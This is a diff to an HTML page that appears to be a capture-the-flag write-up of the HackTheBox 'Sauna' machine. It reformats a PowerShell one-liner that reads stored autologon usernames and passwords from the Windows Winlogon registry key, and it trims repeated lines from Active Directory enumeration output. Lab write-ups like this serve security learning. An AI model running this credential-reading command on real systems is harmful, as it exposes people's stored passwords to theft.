@@ -189,8 +189,8 @@ Surname.N
 <p><em>Looking around the box in the user profile and in the root directory,</em> we don’t see much intersting information. <em>However, when we check for autlogon creds,</em> we do find interesting credentials for the <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> user:</p>
 
 <p>My <strong>PowerShell one-liner</strong>:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference='SilentlyContinue';'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {$Val = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_ ;if($Val){Write-Host -ForegroundColor Green "[+] $_`: $Val"; Clear-Variable Val}else{Write-Host "[-] $_`: Not found"}}
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="o">=</span><span class="s1">'SilentlyContinue'</span><span class="p">;</span><span class="s1">'DefaultDomainName'</span><span class="p">,</span><span class="w"> </span><span class="s1">'DefaultUserName'</span><span class="p">,</span><span class="w"> </span><span class="s1">'DefaultPassword'</span><span class="p">,</span><span class="w"> </span><span class="s1">'AltDefaultDomainName'</span><span class="p">,</span><span class="w"> </span><span class="s1">'AltDefaultUserName'</span><span class="p">,</span><span class="w"> </span><span class="s1">'AltDefaultPassword'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="nv">$Val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ItemPropertyValue</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="p">;</span><span class="kr">if</span><span class="p">(</span><span class="nv">$Val</span><span class="p">){</span><span class="n">Write-Host</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w"> </span><span class="s2">"[+] </span><span class="bp">$_</span><span class="se">`:</span><span class="s2"> </span><span class="nv">$Val</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="n">Clear-Variable</span><span class="w"> </span><span class="nx">Val</span><span class="p">}</span><span class="kr">else</span><span class="p">{</span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[-] </span><span class="bp">$_</span><span class="se">`:</span><span class="s2"> Not found"</span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Sauna/Autologon-creds.jpg" alt="Autologon-creds" /></p>
 
@@ -248,15 +248,6 @@ DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-
 INFO: Found 0 trusts
 DEBUG: Finished writing domain info
 INFO: Starting computer enumeration with 10 workers
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
 DEBUG: Start working
 INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
 DEBUG: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
